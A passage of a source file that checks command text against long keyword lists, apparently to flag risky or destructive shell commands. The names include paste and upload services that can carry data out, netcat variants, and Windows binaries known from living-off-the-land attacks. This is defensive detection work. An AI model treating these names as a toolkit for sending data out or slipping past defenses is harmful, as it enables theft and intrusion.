             ci_contains(text, "telegram-cli") || ci_contains(text, "weechat") ||
             (ci_contains(text, "matterhorn") &&
              (ci_contains(text, " -") || ci_contains(text, " --"))) ||
             ci_contains(text, "ix.io") || ci_contains(text, "0x0.st") ||
             ci_contains(text, "sprunge") || ci_contains(text, "termbin") ||
             ci_contains(text, "ffsend") || ci_contains(text, "dpaste") ||
             ci_contains(text, "hastebin") || ci_contains(text, "ghostbin") ||
             ci_contains(text, "oshi.at") || ci_contains(text, "bashupload") ||
             (ci_contains(text, "gist") &&
              (ci_contains(text, " -") || ci_contains(text, " --") ||
               ci_contains(text, " create") || ci_contains(text, ".md") ||
               ci_contains(text, ".sh") || ci_contains(text, ".txt"))) ||
             ci_contains(text, "cadaver") || ci_contains(text, "davfs2") ||
             ci_contains(text, "s5cmd") || ci_contains(text, "s3fs") ||
             ci_contains(text, "gof3r") || ci_contains(text, "s4cmd") ||
             (ci_contains(text, "minio") &&
              (ci_contains(text, " server") || ci_contains(text, " admin") ||
               ci_contains(text, " gateway"))) ||
             ci_contains(text, "vtysh") ||
             (ci_contains(text, "zebra") &&
              (ci_contains(text, " -") || ci_contains(text, " --"))) ||
             ci_contains(text, "birdc") || ci_contains(text, "bird6") ||
             (ci_contains(text, "bird ") &&
              (ci_contains(text, " -") || ci_contains(text, " --"))) ||
             ci_contains(text, "gobgp") || ci_contains(text, "exabgp") ||
             ci_contains(text, "bmpd") || ci_contains(text, "ldpd") ||
             ci_contains(text, "ryu-manager") ||
             (ci_contains(text, "ryu") &&
              (ci_contains(text, " run") || ci_contains(text, " manager") ||
               ci_contains(text, " --"))) ||
             (ci_contains(text, "onos") &&
              !ci_contains(text, "sonos") && !ci_contains(text, "smonos")) ||
             ci_contains(text, "opendaylight") ||
             (ci_contains(text, "faucet") &&
              (ci_contains(text, " -") || ci_contains(text, " --"))) ||
             ci_contains(text, "avahi-publish") || ci_contains(text, "avahi-browse") ||
             ci_contains(text, "avahi-resolve") ||
             (ci_contains(text, "avahi-daemon") &&
              (ci_contains(text, " --kill") || ci_contains(text, " -k") ||
               ci_contains(text, " --no-drop") || ci_contains(text, " -"))) ||
             (ci_contains(text, "dns-sd") &&
              (ci_contains(text, " -p") || ci_contains(text, " -r") ||
               ci_contains(text, " -b") || ci_contains(text, " -e") ||
               ci_contains(text, " -l") || ci_contains(text, " -g"))) ||
             (ci_contains(text, "mdns") &&
              (ci_contains(text, " -") || ci_contains(text, " --"))) ||
             ci_contains(text, "natpmpc") ||
             (ci_contains(text, "wpa_cli") &&
              (ci_contains(text, " add_network") || ci_contains(text, " set") ||
               ci_contains(text, " reconfigure") || ci_contains(text, " save") ||
               ci_contains(text, " remove") || ci_contains(text, " -"))) ||
             ci_contains(text, "eapol_test") ||
             ci_contains(text, "freeradius") || ci_contains(text, "radiusd") ||
             ci_contains(text, "tac_plus") ||
             ci_contains(text, "uucp") || ci_contains(text, "uux") ||
             ci_contains(text, "uuto") || ci_contains(text, "uuname") ||
             ci_contains(text, "mkosi") ||
             (ci_contains(text, "kiwi") &&
              (ci_contains(text, " system") || ci_contains(text, " build") ||
               ci_contains(text, " --") || ci_contains(text, " -") ||
               ci_contains(text, "kiwi-ng"))) ||
             ci_contains(text, "osbuild") || ci_contains(text, "multistrap") ||
             ci_contains(text, "pbuilder") || ci_contains(text, "sbuild") ||
             (ci_contains(text, "mock") &&
              (ci_contains(text, " --") || ci_contains(text, " -r") ||
               ci_contains(text, " build") || ci_contains(text, " shell"))) ||
             ci_contains(text, "rpmbuild") || ci_contains(text, "rpmspec") ||
             ci_contains(text, "debuild") || ci_contains(text, "pdebuild") ||
             ci_contains(text, "vmdb2") || ci_contains(text, "livemedia-creator") ||
             ci_contains(text, "lorax") || ci_contains(text, "image-builder") ||
             ci_contains(text, "virt-builder") || ci_contains(text, "virt-sysprep") ||
             ci_contains(text, "virt-install") || ci_contains(text, "virt-clone") ||
             ci_contains(text, "virt-edit") || ci_contains(text, "virt-resize") ||
             ci_contains(text, "virt-cat") || ci_contains(text, "virt-copy") ||
             ci_contains(text, "virt-tar") || ci_contains(text, "virt-log") ||
             (ci_contains(text, "cloud-init") &&
              (ci_contains(text, " clean") || ci_contains(text, " init") ||
               ci_contains(text, " deprovision") || ci_contains(text, " collect") ||
               ci_contains(text, " modules") || ci_contains(text, " single") ||
               ci_contains(text, " schema"))) ||
             ci_contains(text, "cloud-localds") ||
             (ci_contains(text, "ostree") &&
              (ci_contains(text, " admin") || ci_contains(text, " refs") ||
               ci_contains(text, " remote") || ci_contains(text, " pull") ||
               ci_contains(text, " commit") || ci_contains(text, " reset") ||
               ci_contains(text, " static-delta"))) ||
             (ci_contains(text, "rpm-ostree") &&
              (ci_contains(text, " install") || ci_contains(text, " uninstall") ||
               ci_contains(text, " override") || ci_contains(text, " rebase") ||
               ci_contains(text, " rollback") || ci_contains(text, " initramfs") ||
               ci_contains(text, " deploy") || ci_contains(text, " upgrade") ||
               ci_contains(text, " ex ") || ci_contains(text, " refresh") ||
               ci_contains(text, " compose"))) ||
             (ci_contains(text, "bootc") &&
              (ci_contains(text, " switch") || ci_contains(text, " upgrade") ||
               ci_contains(text, " install") || ci_contains(text, " update") ||
               ci_contains(text, " edit") || ci_contains(text, " -"))) ||
             ci_contains(text, "transactional-update") ||
             (ci_contains(text, "subscription-manager") &&
              (ci_contains(text, " register") || ci_contains(text, " unregister") ||
               ci_contains(text, " repos") || ci_contains(text, " attach") ||
               ci_contains(text, " release") || ci_contains(text, " refresh") ||
               ci_contains(text, " import") || ci_contains(text, " -"))) ||
             ci_contains(text, "do-release-upgrade") ||
             (ci_contains(text, "zypper") &&
              (ci_contains(text, " dup") || ci_contains(text, " dist-upgrade") ||
               ci_contains(text, " in ") || ci_contains(text, " rm ") ||
               ci_contains(text, " install") || ci_contains(text, " remove") ||
               ci_contains(text, " ar ") || ci_contains(text, " rr ") ||
               ci_contains(text, " mr ") || ci_contains(text, " up") ||
               ci_contains(text, " update"))) ||
             ci_contains(text, "appimagetool") || ci_contains(text, "appimaged") ||
             (ci_contains(text, "pack ") &&
              (ci_contains(text, " build") || ci_contains(text, " --"))) ||
             (ci_contains(text, "ko ") &&
              (ci_contains(text, " build") || ci_contains(text, " apply") ||
               ci_contains(text, " resolve") || ci_contains(text, " publish") ||
               ci_contains(text, " create") || ci_contains(text, " delete"))) ||
             ci_contains(text, "kaniko") ||
             (ci_contains(text, "img ") &&
              (ci_contains(text, " build") || ci_contains(text, " tag") ||
               ci_contains(text, " push") || ci_contains(text, " pull") ||
               ci_contains(text, " save") || ci_contains(text, " load"))) ||
             ci_contains(text, "buildctl") || ci_contains(text, "buildkitd") ||
             ci_contains(text, "awx") || ci_contains(text, "tower-cli") ||
             (ci_contains(text, "fluentd") &&
              (ci_contains(text, " -c") || ci_contains(text, " --") ||
               ci_contains(text, " -s"))) ||
             ci_contains(text, "td-agent") || ci_contains(text, "fluent-bit") ||
             ci_contains(text, "logstash") || ci_contains(text, "filebeat") ||
             ci_contains(text, "metricbeat") || ci_contains(text, "packetbeat") ||
             ci_contains(text, "auditbeat") || ci_contains(text, "winlogbeat") ||
             (ci_contains(text, "vector") &&
              (ci_contains(text, " --") || ci_contains(text, " -c") ||
               ci_contains(text, " validate"))) ||
             ci_contains(text, "syslog-ng") || ci_contains(text, "nxlog") ||
             (ci_contains(text, "splunk") &&
              (ci_contains(text, " add") || ci_contains(text, " remove") ||
               ci_contains(text, " stop") || ci_contains(text, " start") ||
               ci_contains(text, " restart") || ci_contains(text, " disable") ||
               ci_contains(text, " enable") || ci_contains(text, " edit") ||
               ci_contains(text, " delete") || ci_contains(text, " clean") ||
               ci_contains(text, " fsck") || ci_contains(text, " diag") ||
               ci_contains(text, " btool") || ci_contains(text, " -"))) ||
             (ci_contains(text, "cscli") &&
              (ci_contains(text, " decisions") || ci_contains(text, " alerts") ||
               ci_contains(text, " bouncers") || ci_contains(text, " hub") ||
               ci_contains(text, " delete") || ci_contains(text, " -"))) ||
             (ci_contains(text, "suricata") &&
              (ci_contains(text, " -") || ci_contains(text, " --"))) ||
             (ci_contains(text, "snort") &&
              (ci_contains(text, " -") || ci_contains(text, " --"))) ||
             (ci_contains(text, "zeek") &&
              (ci_contains(text, " -") || ci_contains(text, "ctl") ||
               ci_contains(text, "cut"))) ||
             ci_contains(text, "barnyard2") || ci_contains(text, "oinkmaster") ||
             ci_contains(text, "pulledpork") ||
             ci_contains(text, "ossec-") || ci_contains(text, "manage_agents") ||
             ci_contains(text, "agent-auth") || ci_contains(text, "wazuh-") ||
             (ci_contains(text, "aide") &&
              (ci_contains(text, " -i") || ci_contains(text, " --init") ||
               ci_contains(text, " --update") || ci_contains(text, " -"))) ||
             (ci_contains(text, "samhain") &&
              (ci_contains(text, " -t init") || ci_contains(text, " -t update") ||
               ci_contains(text, " -"))) ||
             (ci_contains(text, "haproxy") &&
              (ci_contains(text, " -sf") || ci_contains(text, " -st") ||
               ci_contains(text, " -f") || ci_contains(text, " -c") ||
               ci_contains(text, " -"))) ||
             (ci_contains(text, "kong") &&
              (ci_contains(text, " start") || ci_contains(text, " stop") ||
               ci_contains(text, " reload") || ci_contains(text, " restart") ||
               ci_contains(text, " migrations") || ci_contains(text, " -"))) ||
             ci_contains(text, "krakend") ||
             (ci_contains(text, "envoy") &&
              (ci_contains(text, " -") || ci_contains(text, " --"))) ||
             (ci_contains(text, "traefik") &&
              (ci_contains(text, " -") || ci_contains(text, " --"))) ||
             (ci_contains(text, "caddy") &&
              (ci_contains(text, " run") || ci_contains(text, " start") ||
               ci_contains(text, " stop") || ci_contains(text, " reload") ||
               ci_contains(text, " adapt") || ci_contains(text, " -"))) ||
             (ci_contains(text, "serf") &&
              (ci_contains(text, " agent") || ci_contains(text, " join") ||
               ci_contains(text, " members") || ci_contains(text, " event") ||
               ci_contains(text, " query") || ci_contains(text, " -"))) ||
             ci_contains(text, "kcat") || ci_contains(text, "kafkacat") ||
             (ci_contains(text, "activemq") &&
              (ci_contains(text, " stop") || ci_contains(text, " console") ||
               ci_contains(text, " start") || ci_contains(text, " -"))) ||
             ci_contains(text, "escli") ||
             (ci_contains(text, "solr") &&
              (ci_contains(text, " create") || ci_contains(text, " delete") ||
               ci_contains(text, " stop") || ci_contains(text, " start") ||
               ci_contains(text, " -"))) ||
             ci_contains(text, "pg_ctlcluster") ||
             (ci_contains(text, "mysqladmin") &&
              (ci_contains(text, " shutdown") || ci_contains(text, " processlist") ||
               ci_contains(text, " kill") || ci_contains(text, " variables") ||
               ci_contains(text, " password") || ci_contains(text, " create") ||
               ci_contains(text, " drop") || ci_contains(text, " flush") ||
               ci_contains(text, " reload") || ci_contains(text, " refresh") ||
               ci_contains(text, " status") || ci_contains(text, " -"))) ||
             ci_contains(text, "pg_basebackup") || ci_contains(text, "pg_receivewal") ||
             ci_contains(text, "wal-g") || ci_contains(text, "pgbackrest") ||
             ci_contains(text, "mongoimport") || ci_contains(text, "pgloader") ||
             ci_contains(text, "mysqlimport") || ci_contains(text, "sqlldr") ||
             (ci_contains(text, "bcp ") &&
              (ci_contains(text, " in") || ci_contains(text, " out") ||
               ci_contains(text, " queryout") || ci_contains(text, " format"))) ||
             ci_contains(text, "cfssl") || ci_contains(text, "certstrap") ||
             ci_contains(text, "easyrsa") ||
             (ci_contains(text, "step ") &&
              (ci_contains(text, " ca ") || ci_contains(text, " certificate") ||
               ci_contains(text, " sign") || ci_contains(text, " ssh") ||
               ci_contains(text, " -"))) ||
             ci_contains(text, "step-ca") || ci_contains(text, "mkcert") ||
             ci_contains(text, "minica") ||
             (ci_contains(text, "openssl") &&
              (ci_contains(text, " ca ") || ci_contains(text, " req") ||
               ci_contains(text, " x509") || ci_contains(text, " pkcs12") ||
               ci_contains(text, " cms") || ci_contains(text, " smime") ||
               ci_contains(text, " enc ") || ci_contains(text, " dgst") ||
               ci_contains(text, " pkey") || ci_contains(text, " genpkey") ||
               ci_contains(text, " rsautl") || ci_contains(text, " pkeyutl") ||
               ci_contains(text, " s_server") || ci_contains(text, " s_client") ||
               ci_contains(text, " srp") || ci_contains(text, " passwd") ||
               ci_contains(text, " crl") || ci_contains(text, " ocsp") ||
               ci_contains(text, " pkcs"))) ||
             ci_contains(text, "acme.sh") ||
             (ci_contains(text, "lego") &&
              (ci_contains(text, " -") || ci_contains(text, " --"))) ||
             ci_contains(text, "dehydrated") || ci_contains(text, "kdb5_util") ||
             ci_contains(text, "kprop") || ci_contains(text, "kpropd") ||
             ci_contains(text, "kdb5_ldap_util") ||
             (ci_contains(text, "scoop") &&
              (ci_contains(text, " install") || ci_contains(text, " uninstall") ||
               ci_contains(text, " add") || ci_contains(text, " bucket") ||
               ci_contains(text, " shim") || ci_contains(text, " -"))) ||
             ci_contains(text, "pkg_add") || ci_contains(text, "pkg_delete") ||
             ci_contains(text, "pkg_info") || ci_contains(text, "pkgadd") ||
             ci_contains(text, "pkgrm") || ci_contains(text, "swinstall") ||
             ci_contains(text, "swremove") || ci_contains(text, "pkgin") ||
             ci_contains(text, "installpkg") || ci_contains(text, "removepkg") ||
             ci_contains(text, "upgradepkg") || ci_contains(text, "slackpkg") ||
             ci_contains(text, "pkgtool") || ci_contains(text, "makepkg") ||
             ci_contains(text, "opkg") || ci_contains(text, "ipkg") ||
             (ci_contains(text, "emerge") &&
              (ci_contains(text, " --") || ci_contains(text, " -") ||
               ci_contains(text, " unmerge") || ci_contains(text, " sync"))) ||
             ci_contains(text, "ebuild") || ci_contains(text, "equery") ||
             ci_contains(text, "dispatch-conf") || ci_contains(text, "etc-update") ||
             ci_contains(text, "eselect") || ci_contains(text, "genkernel") ||
             ci_contains(text, "revdep-rebuild") ||
             ci_contains(text, "xbps-") ||
             (ci_contains(text, "nixos-rebuild") &&
              (ci_contains(text, " switch") || ci_contains(text, " boot") ||
               ci_contains(text, " test") || ci_contains(text, " build") ||
               ci_contains(text, " -"))) ||
             ci_contains(text, "mtd-write") ||
             (ci_contains(text, "nvram") &&
              (ci_contains(text, " set") || ci_contains(text, " commit") ||
               ci_contains(text, " unset") || ci_contains(text, " erase") ||
               ci_contains(text, " show") || ci_contains(text, " get") ||
               ci_contains(text, " -"))) ||
             ci_contains(text, "sysupgrade") || ci_contains(text, "fw_printenv") ||
             ci_contains(text, "fw_setenv") || ci_contains(text, "uboot-env") ||
             (ci_contains(text, "pm ") &&
              !ci_contains(text, "rpm") &&
              (ci_contains(text, " install") || ci_contains(text, " uninstall") ||
               ci_contains(text, " disable") || ci_contains(text, " enable") ||
               ci_contains(text, " grant") || ci_contains(text, " revoke") ||
               ci_contains(text, " clear") || ci_contains(text, " set-") ||
               ci_contains(text, " move") || ci_contains(text, " wipe") ||
               ci_contains(text, " suspend") || ci_contains(text, " hide") ||
               ci_contains(text, " unhide") || ci_contains(text, " trim") ||
               ci_contains(text, " create-user") || ci_contains(text, " remove-user") ||
               ci_contains(text, " path") || ci_contains(text, " dump"))) ||
             (ci_contains(text, "am ") &&
              !ci_contains(text, "prog") && !ci_contains(text, "telegram") &&
              !ci_contains(text, "ham ") && !ci_contains(text, "yam") &&
              (ci_contains(text, " start -") || ci_contains(text, " broadcast") ||
               ci_contains(text, " instrument") || ci_contains(text, " force-stop") ||
               ci_contains(text, " profile") || ci_contains(text, " kill") ||
               ci_contains(text, " task") || ci_contains(text, " monitor"))) ||
             (ci_contains(text, "settings ") &&
              (ci_contains(text, " put") || ci_contains(text, " delete") ||
               ci_contains(text, " get") || ci_contains(text, " list"))) ||
             ci_contains(text, "setprop") || ci_contains(text, "appops") ||
             ci_contains(text, "dumpsys") || ci_contains(text, "uiautomator") ||
             (ci_contains(text, "svc ") &&
              (ci_contains(text, " data") || ci_contains(text, " wifi") ||
               ci_contains(text, " bluetooth") || ci_contains(text, " nfc") ||
               ci_contains(text, " power") || ci_contains(text, " usb"))) ||
             (ci_contains(text, "input ") &&
              (ci_contains(text, " keyevent") || ci_contains(text, " text") ||
               ci_contains(text, " tap") || ci_contains(text, " swipe") ||
               ci_contains(text, " draganddrop") || ci_contains(text, " press") ||
               ci_contains(text, " roll") || ci_contains(text, " source"))) ||
             (ci_contains(text, "monkey") &&
              (ci_contains(text, " -p") || ci_contains(text, " --"))) ||
             ci_contains(text, "install-recovery.sh") ||
             (ci_contains(text, "cmd ") &&
              (ci_contains(text, " activity") || ci_contains(text, " package") ||
               ci_contains(text, " notification") || ci_contains(text, " power") ||
               ci_contains(text, " statusbar") || ci_contains(text, " alarm") ||
               ci_contains(text, " appops") || ci_contains(text, " connectivity"))) ||
             ci_contains(text, "st-flash") || ci_contains(text, "stm32flash") ||
             ci_contains(text, "nrfjprog") || ci_contains(text, "bossac") ||
             ci_contains(text, "teensy-loader") || ci_contains(text, "espflash") ||
             ci_contains(text, "picotool") || ci_contains(text, "pyocd") ||
             ci_contains(text, "jlinkexe") || ci_contains(text, "j-link") ||
             (ci_contains(text, "nvidia-smi") &&
              (ci_contains(text, " --gpu-reset") || ci_contains(text, " -r") ||
               ci_contains(text, " -lgc") || ci_contains(text, " -lgm") ||
               ci_contains(text, " -lm") || ci_contains(text, " -ac") ||
               ci_contains(text, " -gom") || ci_contains(text, " -e") ||
               ci_contains(text, " -pm") || ci_contains(text, " -ecc") ||
               ci_contains(text, " -fdm") || ci_contains(text, " --persistence") ||
               ci_contains(text, " --pci") || ci_contains(text, " drain") ||
               ci_contains(text, " conf-compute") || ci_contains(text, " mig"))) ||
             ci_contains(text, "amd-smi") || ci_contains(text, "rocm-smi") ||
             (ci_contains(text, "udisksctl") &&
              (ci_contains(text, " mount") || ci_contains(text, " unmount") ||
               ci_contains(text, " loop-setup") || ci_contains(text, " loop-delete") ||
               ci_contains(text, " power-off") || ci_contains(text, " lock") ||
               ci_contains(text, " unlock") || ci_contains(text, " smart-simulate") ||
               ci_contains(text, " -"))) ||
             (ci_contains(text, "pkcon") &&
              (ci_contains(text, " install") || ci_contains(text, " remove") ||
               ci_contains(text, " update") || ci_contains(text, " refresh") ||
               ci_contains(text, " -"))) ||
             ci_contains(text, "pkmon") ||
             (ci_contains(text, "rpm ") &&
              (ci_contains(text, " --eval") || ci_contains(text, " --define") ||
               ci_contains(text, " --setperms") || ci_contains(text, " --setugids") ||
               ci_contains(text, " --import") || ci_contains(text, " --rebuilddb") ||
               ci_contains(text, " --initdb") || ci_contains(text, " --erase") ||
               ci_contains(text, " -e") || ci_contains(text, " -i") ||
               ci_contains(text, " -u") || ci_contains(text, " --delete") ||
               ci_contains(text, " --force"))) ||
             (ci_contains(text, "dpkg") &&
              (ci_contains(text, " -i") || ci_contains(text, " --install") ||
               ci_contains(text, " --unpack") || ci_contains(text, " --configure") ||
               ci_contains(text, " --remove") || ci_contains(text, " --purge") ||
               ci_contains(text, " -r") || ci_contains(text, " -p") ||
               ci_contains(text, " --force") || ci_contains(text, " --set-selections"))) ||
             (ci_contains(text, "apt-key") &&
              (ci_contains(text, " add") || ci_contains(text, " del") ||
               ci_contains(text, " update") || ci_contains(text, " net-update") ||
               ci_contains(text, " adv") || ci_contains(text, " -"))) ||
             ci_contains(text, "chvt") || ci_contains(text, "openvt") ||
             ci_contains(text, "fgconsole") || ci_contains(text, "deallocvt") ||
             ci_contains(text, "vlock") || ci_contains(text, "physlock") ||
             ci_contains(text, "xtrlock") ||
             ci_contains(text, "s2disk") || ci_contains(text, "pm-hibernate") ||
             ci_contains(text, "uswsusp") ||
             ci_contains(text, "pcs ") || ci_contains(text, "crmsh") ||
             ci_contains(text, "corosync-cfgtool") || ci_contains(text, "cibadmin") ||
             ci_contains(text, "stonith") || ci_contains(text, "fence_") ||
             (ci_contains(text, "gluster") &&
              (ci_contains(text, " volume") || ci_contains(text, " peer") ||
               ci_contains(text, " -"))) ||
             ci_contains(text, "megacli") || ci_contains(text, "storcli") ||
             ci_contains(text, "perccli") || ci_contains(text, "arcconf") ||
             ci_contains(text, "tw_cli") || ci_contains(text, "hpacucli") ||
             ci_contains(text, "ssacli") || ci_contains(text, "sas2ircu") ||
             ci_contains(text, "sas3ircu") || ci_contains(text, "mfiutil") ||
             ci_contains(text, "sesutil") ||
             (ci_contains(text, "xl ") &&
              (ci_contains(text, " create") || ci_contains(text, " destroy") ||
               ci_contains(text, " pause") || ci_contains(text, " shutdown") ||
               ci_contains(text, " reboot") || ci_contains(text, " migrate") ||
               ci_contains(text, " -"))) ||
             (ci_contains(text, "xm ") &&
              (ci_contains(text, " create") || ci_contains(text, " destroy") ||
               ci_contains(text, " pause") || ci_contains(text, " shutdown") ||
               ci_contains(text, " -"))) ||
             (ci_contains(text, "xe ") &&
              (ci_contains(text, " vm-") || ci_contains(text, " host") ||
               ci_contains(text, " pool") || ci_contains(text, " sr-") ||
               ci_contains(text, " -"))) ||
             ci_contains(text, "xenstore-") || ci_contains(text, "lxd") ||
             ci_contains(text, "dmraid") || ci_contains(text, "getprop") ||
             ci_contains(text, "snmpset") || ci_contains(text, "snmptable") ||
             ci_contains(text, "snmpusm") || ci_contains(text, "snmpvacm") ||
             ci_contains(text, "snmptrapd") || ci_contains(text, "snmpinform") ||
             ci_contains(text, "encode_keychange") || ci_contains(text, "snmpconf") ||
             ci_contains(text, "traptoemail")) {
        what = "xcan/android/router/build/routing/mgmt/destructive primitive";
        }
        else if (ci_contains(text, "iscsicpl") ||
             (ci_contains(text, "wbadmin") &&
              (ci_contains(text, " get") || ci_contains(text, " delete") ||
               ci_contains(text, " stop") || ci_contains(text, " disable") ||
               ci_contains(text, " start backup") ||
               ci_contains(text, " delete catalog"))) ||
             (ci_contains(text, "javac") &&
              (ci_contains(text, ".java") || ci_contains(text, " -"))) ||
             (ci_contains(text, "java ") &&
              (ci_contains(text, " -agentlib") || ci_contains(text, " -agentpath") ||
               ci_contains(text, " -javaagent") || ci_contains(text, " -Xrunhprof") ||
               ci_contains(text, " -agent"))) ||
             (ci_contains(text, "mvn ") &&
              (ci_contains(text, " exec:") || ci_contains(text, " ant:") ||
               ci_contains(text, " -Dexec"))) ||
             (ci_contains(text, "ant ") &&
              (ci_contains(text, " -f") || ci_contains(text, " -buildfile") ||
               ci_contains(text, " -D") || ci_contains(text, " -find"))) ||
             (ci_contains(text, "gradle") &&
              (ci_contains(text, " -") || ci_contains(text, " init") ||
               ci_contains(text, " build") || ci_contains(text, " clean"))) ||
             (ci_contains(text, "sbt") &&
              (ci_contains(text, " -") || ci_contains(text, " compile") ||
               ci_contains(text, " run") || ci_contains(text, " clean"))) ||
             (ci_contains(text, "lein") &&
              (ci_contains(text, " run") || ci_contains(text, " repl") ||
               ci_contains(text, " uberjar") || ci_contains(text, " -"))) ||
             (ci_contains(text, "clojure") &&
              (ci_contains(text, " -e") || ci_contains(text, " -M") ||
               ci_contains(text, " -X") || ci_contains(text, " -T"))) ||
             (ci_contains(text, "celery") &&
              (ci_contains(text, " -a") || ci_contains(text, " worker") ||
               ci_contains(text, " call") || ci_contains(text, " purge") ||
               ci_contains(text, " -b"))) ||
             (ci_contains(text, "rq ") &&
              (ci_contains(text, " worker") || ci_contains(text, " enqueue") ||
               ci_contains(text, " -u"))) ||
             ci_contains(text, "sidekiq") ||
             (ci_contains(text, "rails ") &&
              (ci_contains(text, " console") || ci_contains(text, " runner") ||
               ci_contains(text, " dbconsole") || ci_contains(text, " destroy") ||
               ci_contains(text, " db:migrate") || ci_contains(text, " g "))) ||
             (ci_contains(text, "rake ") &&
              (ci_contains(text, " -f") || ci_contains(text, ":") ||
               ci_contains(text, " -"))) ||
             (ci_contains(text, "pry ") &&
              (ci_contains(text, " -") || ci_contains(text, " --"))) ||
             (ci_contains(text, "php artisan") ||
              (ci_contains(text, "artisan ") &&
              (ci_contains(text, " tinker") || ci_contains(text, " serve") ||
               ci_contains(text, " migrate") || ci_contains(text, " make:") ||
               ci_contains(text, " db:") || ci_contains(text, " config:") ||
               ci_contains(text, " down") || ci_contains(text, " optimize")))) ||
             (ci_contains(text, "wp ") &&
              (ci_contains(text, " eval") || ci_contains(text, " eval-file") ||
               ci_contains(text, " shell") || ci_contains(text, " db ") ||
               ci_contains(text, " user ") || ci_contains(text, " plugin") ||
               ci_contains(text, " theme") || ci_contains(text, " cron"))) ||
             (ci_contains(text, "drupal") &&
              (ci_contains(text, " -") || ci_contains(text, " --"))) ||
             (ci_contains(text, "console") &&
              (ci_contains(text, " doctrine:") || ci_contains(text, " make:") ||
               ci_contains(text, "bin/console"))) ||
             (ci_contains(text, "flutter") &&
              (ci_contains(text, " pub") || ci_contains(text, " run") ||
               ci_contains(text, " build") || ci_contains(text, " channel"))) ||
             (ci_contains(text, "expo") &&
              (ci_contains(text, " publish") || ci_contains(text, " build") ||
               ci_contains(text, " -") || ci_contains(text, " --"))) ||
             ci_contains(text, "age-keygen") || ci_contains(text, "minisign") ||
             ci_contains(text, "signify") || ci_contains(text, "rsign2") ||
             (ci_contains(text, "gpg") &&
              (ci_contains(text, " --gen-key") ||
               ci_contains(text, " --full-gen") ||
               ci_contains(text, " --quick-gen"))) ||
             (ci_contains(text, "ssh-keygen") &&
              (ci_contains(text, " -s") || ci_contains(text, " -R") ||
               ci_contains(text, " -A") || ci_contains(text, " -k") ||
               ci_contains(text, " -K") || ci_contains(text, " -I") ||
               ci_contains(text, " -L") || ci_contains(text, " -r") ||
               ci_contains(text, " -h"))) ||
             ci_contains(text, "ssh-keyscan") || ci_contains(text, "puttygen") ||
             (ci_contains(text, "tftp") &&
              (ci_contains(text, " get") || ci_contains(text, " put") ||
               ci_contains(text, " -"))) ||
             (ci_contains(text, "kermit") &&
              (ci_contains(text, " -s") || ci_contains(text, " -g") ||
               ci_contains(text, " -C"))) ||
             ci_contains(text, "lrzsz") || ci_contains(text, "rz -e") ||
             ci_contains(text, "sz -e") || ci_contains(text, "nc6") ||
             ci_contains(text, "pnetcat") || ci_contains(text, "sbd") ||
             ci_contains(text, "expand.exe") ||
             (ci_contains(text, "expand") &&
              (ci_contains(text, ".cab") || ci_contains(text, " -f"))) ||
             ci_contains(text, "extrac32") || ci_contains(text, "print /d") ||
             ci_contains(text, "wabmig") || ci_contains(text, "pwlauncher") ||
             ci_contains(text, "syncappvpublishingserver") ||
             ci_contains(text, "ieexec") || ci_contains(text, "installutil") ||
             ci_contains(text, "regasm") || ci_contains(text, "regsvcs") ||
             ci_contains(text, "ilasm") || ci_contains(text, "gacutil") ||
             ci_contains(text, "corflags") || ci_contains(text, "aspnet_compiler") ||
             ci_contains(text, "aspnet_regiis") || ci_contains(text, "aspnet_regsql") ||
             ci_contains(text, "aspnet_regbrowsers") ||
             ci_contains(text, "mavinject") || ci_contains(text, "pcalua") ||
             ci_contains(text, "dump64") || ci_contains(text, "procdump") ||
             ci_contains(text, "rdrleakdiag") ||
             ((ci_contains(text, "chmod") || ci_contains(text, "chown")) &&
              ci_contains(text, " --reference")) ||
             (ci_contains(text, "install -o ") ||
              ci_contains(text, "install -g ") ||
              ci_contains(text, "install -m 777") ||
              ci_contains(text, "install -m 666")) ||
             (ci_contains(text, "apt-mark") &&
              (ci_contains(text, " hold") || ci_contains(text, " unhold"))) ||
             (ci_contains(text, "aptitude") &&
              (ci_contains(text, " install") || ci_contains(text, " remove") ||
               ci_contains(text, " purge") || ci_contains(text, " -y"))) ||
             ci_contains(text, "dselect") || ci_contains(text, "dpkg-divert") ||
             (ci_contains(text, "invoke-rc.d") &&
              (ci_contains(text, " stop") || ci_contains(text, " start") ||
               ci_contains(text, " restart"))) ||
             (ci_contains(text, "sv ") &&
              !ci_contains(text, "csv") &&
              (ci_contains(text, " stop") || ci_contains(text, " start") ||
               ci_contains(text, " -d") || ci_contains(text, " -u") ||
               ci_contains(text, " force") || ci_contains(text, " kill") ||
               ci_contains(text, " exit") || ci_contains(text, " term") ||
               ci_contains(text, " restart"))) ||
             ci_contains(text, "systemd-cron") ||
             (ci_contains(text, "loginctl") &&
              (ci_contains(text, " lock") || ci_contains(text, " terminate") ||
               ci_contains(text, " kill") || ci_contains(text, " disable"))) ||
             (ci_contains(text, "busctl") &&
              (ci_contains(text, " call") || ci_contains(text, " set-property") ||
               ci_contains(text, " introspect") || ci_contains(text, " monitor"))) ||
             (ci_contains(text, "dbus-send") &&
              (ci_contains(text, " --system") || ci_contains(text, " --dest") ||
               ci_contains(text, " --print-reply"))) ||
             (ci_contains(text, "gdbus") &&
              (ci_contains(text, " call") || ci_contains(text, " emit") ||
               ci_contains(text, " monitor"))) ||
             ci_contains(text, "qdbus") ||
             (ci_contains(text, "jls") || ci_contains(text, "jexec") ||
              ci_contains(text, "jailcmd")) ||
             (ci_contains(text, "jail") &&
              (ci_contains(text, " -c") || ci_contains(text, " -m") ||
               ci_contains(text, " -r") || ci_contains(text, " -d") ||
               ci_contains(text, " -v"))) ||
             (ci_contains(text, "iocage") &&
              (ci_contains(text, " exec") || ci_contains(text, " console") ||
               ci_contains(text, " set") || ci_contains(text, " destroy") ||
               ci_contains(text, " create") || ci_contains(text, " jail"))) ||
             (ci_contains(text, "ezjail") &&
              (ci_contains(text, " console") || ci_contains(text, " create") ||
               ci_contains(text, " delete") || ci_contains(text, " archive") ||
               ci_contains(text, " -"))) ||
             (ci_contains(text, "bastille") &&
              (ci_contains(text, " cmd") || ci_contains(text, " create") ||
               ci_contains(text, " destroy") || ci_contains(text, " console") ||
               ci_contains(text, " bootstrap") || ci_contains(text, " export") ||
               ci_contains(text, " pkg"))) ||
             (ci_contains(text, "pot") &&
              (ci_contains(text, " exec") || ci_contains(text, " run") ||
               ci_contains(text, " create") || ci_contains(text, " start") ||
               ci_contains(text, " -"))) ||
             ci_contains(text, "firecfg") ||
             (ci_contains(text, "puppeteer") || ci_contains(text, "playwright") ||
              ci_contains(text, "chromedriver") || ci_contains(text, "geckodriver") ||
              ci_contains(text, "webdriver")) ||
